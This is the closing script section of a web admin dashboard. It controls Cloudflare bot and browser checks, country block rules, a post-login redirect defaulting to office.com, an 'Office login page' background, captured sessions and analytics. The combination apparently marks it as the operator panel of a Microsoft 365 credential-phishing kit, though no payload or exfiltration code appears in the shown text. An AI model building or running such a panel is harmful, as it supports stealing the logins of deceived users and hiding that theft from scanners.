                } else {
                    throw new Error(data.error || 'Configuration failed');
                }
            } catch (error) {
                console.error('Error saving Cloudflare config:', error);
                document.getElementById('cf-config-status').innerHTML = 
                    `<span class="status-badge status-error">‚ùå Configuration Failed: ${error.message}</span>`;
                alert('‚ùå CONFIGURATION FAILED: ' + error.message);
            } finally {
                saveBtn.disabled = false;
                saveBtn.textContent = 'Save Configuration';
            }
        }

        async function loadCloudflareStatus() {
            if (!isAuthenticated) {
                document.getElementById('cf-status').textContent = 'AUTH REQUIRED';
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/status?token=${encodeURIComponent(token)}`);

                if (response.status === 401) {
                    logout();
                    return;
                }

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }

                const data = await response.json();

                if (data.success) {
                    document.getElementById('cf-status').textContent = 'ONLINE';
                    updateCloudflareStatus(data.settings);
                    await loadCountryRules();
                } else {
                    // Not configured - show graceful message
                    document.getElementById('cf-status').textContent = 'NOT CONFIGURED';
                    if (data.error && data.error.includes('not configured')) {
                        document.getElementById('cf-config-status').innerHTML = 
                            '<span class="status-badge status-error">‚ö†Ô∏è Not Configured</span>';
                    }
                }
            } catch (error) {
                // Silent fail - Cloudflare is optional
                document.getElementById('cf-status').textContent = 'NOT CONFIGURED';
            }
        }

        function updateCloudflareStatus(settings) {
            const botFightStatus = document.getElementById('bot-fight-status');
            if (botFightStatus) {
                botFightStatus.textContent = settings.botFightMode ? 'ON' : 'OFF';
            }

            const securityLevelStatus = document.getElementById('security-level-status');
            const securityLevelSelect = document.getElementById('security-level-select');

            if (securityLevelStatus) {
                securityLevelStatus.textContent = settings.securityLevel.toUpperCase();
            }

            if (securityLevelSelect) {
                securityLevelSelect.value = settings.securityLevel;
            }

            const browserCheckStatus = document.getElementById('browser-check-status');
            if (browserCheckStatus) {
                browserCheckStatus.textContent = settings.browserCheck ? 'ON' : 'OFF';
            }
        }

        async function toggleBotFight() {
            if (!isAuthenticated) return;

            const btn = document.getElementById('bot-fight-btn');
            btn.disabled = true;
            btn.textContent = 'PROCESSING...';

            try {
                const currentStatus = document.getElementById('bot-fight-status').textContent === 'ON';
                const token = getStoredToken();

                const response = await fetch(`/api/admin/cloudflare/bot-fight?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: !currentStatus })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('bot-fight-status').textContent = data.enabled ? 'ON' : 'OFF';
                } else {
                    alert('Error: ' + (data.message || data.error || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error toggling bot fight:', error);
                alert('Network error occurred');
            } finally {
                btn.disabled = false;
                btn.textContent = 'Toggle Bot Fight';
            }
        }

        async function setSecurityLevel() {
            if (!isAuthenticated) return;

            const level = document.getElementById('security-level-select').value;
            const token = getStoredToken();

            try {
                const response = await fetch(`/api/admin/cloudflare/security-level?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ level })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('security-level-status').textContent = data.level.toUpperCase();
                } else {
                    console.error('Security level error:', data.error);
                    alert('Error: ' + (data.message || data.error || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error setting security level:', error);
                alert('Network error occurred');
            }
        }

        async function toggleBrowserCheck() {
            if (!isAuthenticated) return;

            const btn = document.getElementById('browser-check-btn');
            btn.disabled = true;
            btn.textContent = 'PROCESSING...';

            try {
                const currentStatus = document.getElementById('browser-check-status').textContent === 'ON';
                const token = getStoredToken();

                const response = await fetch(`/api/admin/cloudflare/browser-check?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: !currentStatus })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('browser-check-status').textContent = data.enabled ? 'ON' : 'OFF';
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (error) {
                console.error('Error toggling browser check:', error);
                alert('Network error occurred');
            } finally {
                btn.disabled = false;
                btn.textContent = 'Toggle Browser Check';
            }
        }

        async function loadCountryRules() {
            if (!isAuthenticated) return;

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/country-rules?token=${encodeURIComponent(token)}`);
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }

                const data = await response.json();

                if (data.success) {
                    displayCountryRules(data.rules);
                    document.getElementById('country-rules-count').textContent = data.count;

                    if (data.count === 0) {
                        document.getElementById('country-access-status').textContent = 'OPEN';
                    } else {
                        document.getElementById('country-access-status').textContent = 'RESTRICTED';
                    }
                } else {
                    // Cloudflare not configured - show graceful message
                    document.getElementById('country-rules-container').innerHTML = `
                        <div style="color: #94a3b8; font-size: 14px; text-align: center; padding: 15px;">
                            Cloudflare not configured
                        </div>
                    `;
                    document.getElementById('country-rules-count').textContent = '-';
                    document.getElementById('country-access-status').textContent = 'N/A';
                }
            } catch (error) {
                // Silent fail - Cloudflare is optional
                document.getElementById('country-rules-container').innerHTML = `
                    <div style="color: #94a3b8; font-size: 14px; text-align: center; padding: 15px;">
                        Cloudflare features require configuration
                    </div>
                `;
                document.getElementById('country-rules-count').textContent = '-';
                document.getElementById('country-access-status').textContent = 'N/A';
            }
        }

        function displayCountryRules(rules) {
            const container = document.getElementById('country-rules-container');

            if (!rules || rules.length === 0) {
                container.innerHTML = `
                    <div style="color: #94a3b8; font-size: 14px; text-align: center; padding: 15px;">
                        No country access rules configured
                    </div>
                `;
                return;
            }

            const rulesHtml = rules.map(rule => {
                const isBlockRule = rule.expression.includes(' in ');
                const actionText = isBlockRule ? 'BLOCK' : 'ALLOW ONLY';
                const actionColor = isBlockRule ? '#ef4444' : '#22c55e';

                const matches = rule.expression.match(/\{"([^"]+)"/);
                const countries = matches ? matches[1].split('" "') : [];

                return `
                    <div style="background: #0f172a; border: 1px solid #475569; padding: 12px; border-radius: 6px; margin-bottom: 12px;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                            <div style="color: ${actionColor}; font-size: 14px; font-weight: bold;">${actionText}</div>
                            <button onclick="deleteCountryRule('${rule.id}')" style="background: #ef4444; color: white; border: none; padding: 4px 12px; font-size: 12px; border-radius: 4px; cursor: pointer;">
                                DELETE
                            </button>
                        </div>
                        <div style="color: #fb923c; font-size: 13px; margin-bottom: 4px;">
                            Countries: ${countries.join(', ')}
                        </div>
                        <div style="color: #94a3b8; font-size: 12px;">
                            ${rule.description || 'No description'}
                        </div>
                    </div>
                `;
            }).join('');

            container.innerHTML = rulesHtml;
        }

        async function createCountryRule() {
            if (!isAuthenticated) return;

            const action = document.getElementById('country-action-select').value;
            const countriesInput = document.getElementById('country-codes-input').value.trim();
            const ruleName = document.getElementById('country-rule-name').value.trim();
            const btn = document.getElementById('create-country-rule-btn');

            if (!countriesInput) {
                alert('Please enter country codes (e.g., CN,RU,KP)');
                return;
            }

            const countries = countriesInput.split(',').map(c => c.trim().toUpperCase()).filter(c => c.length === 2);

            if (countries.length === 0) {
                alert('Please enter valid 2-letter country codes separated by commas');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'CREATING...';

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/country-rules?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        action: action,
                        countries: countries,
                        ruleName: ruleName || undefined
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('country-codes-input').value = '';
                    document.getElementById('country-rule-name').value = '';
                    await loadCountryRules();
                    alert(`‚úÖ Country rule created successfully!\n\n${data.message}`);
                } else {
                    alert('Error creating country rule: ' + (data.message || data.error || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error creating country rule:', error);
                alert('Network error occurred while creating rule');
            } finally {
                btn.disabled = false;
                btn.textContent = 'Create Rule';
            }
        }

        async function deleteCountryRule(ruleId) {
            if (!isAuthenticated) return;

            if (!confirm('Are you sure you want to delete this country access rule?')) {
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/country-rules/${ruleId}?token=${encodeURIComponent(token)}`, {
                    method: 'DELETE'
                });

                const data = await response.json();

                if (data.success) {
                    await loadCountryRules();
                } else {
                    alert('Error deleting country rule: ' + (data.message || data.error || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error deleting country rule:', error);
                alert('Network error occurred while deleting rule');
            }
        }

        async function enableUnderAttack() {
            if (!confirm('‚ö†Ô∏è This will enable UNDER ATTACK MODE - very strict security. Continue?')) return;

            const token = getStoredToken();

            try {
                const response = await fetch(`/api/admin/cloudflare/security-level?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ level: 'under_attack' })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('security-level-status').textContent = 'UNDER ATTACK';
                    document.getElementById('security-level-select').value = 'under_attack';
                    alert('üö® UNDER ATTACK MODE ENABLED');
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (error) {
                console.error('Error enabling under attack mode:', error);
                alert('Network error occurred');
            }
        }

        async function disableAllProtection() {
            if (!confirm('‚ö†Ô∏è This will DISABLE ALL PROTECTION. Are you sure?')) return;

            const token = getStoredToken();

            try {
                await fetch(`/api/admin/cloudflare/bot-fight?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: false })
                });

                await fetch(`/api/admin/cloudflare/security-level?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ level: 'off' })
                });

                await fetch(`/api/admin/cloudflare/browser-check?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: false })
                });

                setTimeout(() => loadCloudflareStatus(), 1000);
                alert('üîì ALL PROTECTION DISABLED');
            } catch (error) {
                console.error('Error disabling protection:', error);
                alert('Network error occurred');
            }
        }

        async function loadRedirectConfig() {
            try {
                const response = await fetch(`/api/internal/redirect-url`);

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }

                const data = await response.json();

                if (data.success && data.redirectUrl) {
                    const currentUrl = data.redirectUrl;
                    document.getElementById('current-redirect-display').textContent = `üéØ ${currentUrl}`;

                    document.getElementById('redirect-status').innerHTML = 
                        `<span class="status-badge status-success">üìç REDIRECT STATUS: ACTIVE ‚Üí ${currentUrl}</span>`;

                    const select = document.getElementById('redirect-destination');
                    const option = Array.from(select.options).find(opt => opt.value === currentUrl);
                    if (option) {
                        select.value = currentUrl;
                        document.getElementById('custom-redirect-url').style.display = 'none';
                    } else {
                        select.value = 'custom';
                        document.getElementById('custom-redirect-url').value = currentUrl;
                        document.getElementById('custom-redirect-url').style.display = 'block';
                    }
                } else {
                    throw new Error(data.error || 'Failed to load redirect configuration');
                }
            } catch (error) {
                console.error('Error loading redirect config:', error);
                document.getElementById('current-redirect-display').textContent = '‚ùå Failed to load';
                document.getElementById('redirect-status').innerHTML = 
                    `<span class="status-badge status-error">‚ùå ERROR: ${error.message || 'Network Error'}</span>`;

                const select = document.getElementById('redirect-destination');
                if (select) {
                    select.value = 'https://office.com';
                }
                const customInput = document.getElementById('custom-redirect-url');
                if (customInput) {
                    customInput.style.display = 'none';
                }
            }
        }

        async function updateProjectRedirect() {
            if (!isAuthenticated) {
                alert('‚ö†Ô∏è AUTHENTICATION REQUIRED TO UPDATE REDIRECT');
                return;
            }

            const token = getStoredToken();
            if (!token) {
                alert('‚ö†Ô∏è AUTHENTICATION TOKEN MISSING');
                logout();
                return;
            }

            const select = document.getElementById('redirect-destination');
            const customInput = document.getElementById('custom-redirect-url');

            let targetUrl = select.value;
            if (targetUrl === 'custom') {
                targetUrl = customInput.value.trim();
                if (!targetUrl) {
                    alert('Please enter a custom URL');
                    return;
                }
                try {
                    new URL(targetUrl);
                } catch (e) {
                    alert('Please enter a valid URL (including https://)');
                    return;
                }
            }

            const updateBtn = event.target;
            const originalText = updateBtn.textContent;
            updateBtn.disabled = true;
            updateBtn.textContent = 'UPDATING...';

            try {
                const response = await fetch(`/api/admin/project-redirect?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ redirectUrl: targetUrl })
                });

                if (response.status === 401) {
                    logout();
                    alert('SESSION EXPIRED: RE-AUTHENTICATION REQUIRED');
                    return;
                }

                const data = await response.json();

                if (data.success) {
                    document.getElementById('current-redirect-display').textContent = `üéØ ${targetUrl}`;
                    document.getElementById('redirect-status').innerHTML = 
                        `<span class="status-badge status-success">‚úÖ PROJECT REDIRECT UPDATED: ${targetUrl}</span>`;
                    alert(`‚úÖ Project redirect destination updated to: ${targetUrl}\nThis affects all login redirects in your project.`);
                } else {
                    alert('Error: ' + (data.error || 'Update failed'));
                    document.getElementById('redirect-status').innerHTML = 
                        `<span class="status-badge status-error">‚ùå UPDATE FAILED: ${data.error || 'Unknown error'}</span>`;
                }
            } catch (error) {
                console.error('Error updating redirect config:', error);
                alert('Network error occurred: ' + error.message);
                document.getElementById('redirect-status').innerHTML = 
                    `<span class="status-badge status-error">‚ùå NETWORK ERROR</span>`;
            } finally {
                updateBtn.disabled = false;
                updateBtn.textContent = originalText;
            }
        }

        async function loadBackgroundConfig() {
            if (!isAuthenticated) return;

            const select = document.getElementById('background-url-select');

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/internal/background-url?token=${encodeURIComponent(token)}`);
                const data = await response.json();

                if (data.success && data.backgroundUrl) {
                    const savedUrl = data.backgroundUrl;

                    if (select.options[0].value === savedUrl) {
                        select.value = savedUrl;
                    } else {
                        select.value = select.options[0].value;
                    }
                } else {
                    select.value = select.options[0].value;
                }
            } catch (error) {
                console.error('Error loading background config:', error);
                select.value = select.options[0].value;
            }
        }

        async function updateBackgroundUrl() {
            const select = document.getElementById('background-url-select');
            const url = select.value;

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/background-url?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ backgroundUrl: url })
                });

                const data = await response.json();
                if (data.success) {
                    alert('‚úÖ Office login page background updated successfully!');
                } else {
                    alert('‚ö†Ô∏è Failed to save background: ' + (data.error || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error saving background URL:', error);
                alert('‚ùå Network error while saving background');
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            checkAuthOnLoad();
            setTimeout(() => {
                loadAnalytics();
                loadRedirectConfig();
            }, 500);

            const select = document.getElementById('redirect-destination');
            const customInput = document.getElementById('custom-redirect-url');

            if (select && customInput) {
                select.addEventListener('change', function() {
                    if (this.value === 'custom') {
                        customInput.style.display = 'block';
                        customInput.focus();
                    } else {
                        customInput.style.display = 'none';
                    }
                });
            }
        });

        // Auto-refresh interval - refresh all data every 30 seconds
        setInterval(() => {
            if (isAuthenticated) {
                const activeTab = document.querySelector('.tab-content.active');
                const activeTabId = activeTab ? activeTab.id : '';
                
                // Always refresh analytics (shown on dashboard)
                loadAnalytics();
                
                // Refresh active tab data
                if (activeTabId === 'sessions-tab') {
                    loadSessions();
                } else if (activeTabId === 'security-tab') {
                    loadCloudflareStatus();
                } else if (activeTabId === 'country-tab') {
                    loadCountryRules();
                }
            }
        }, 30000);
    </script>
</body>
</html>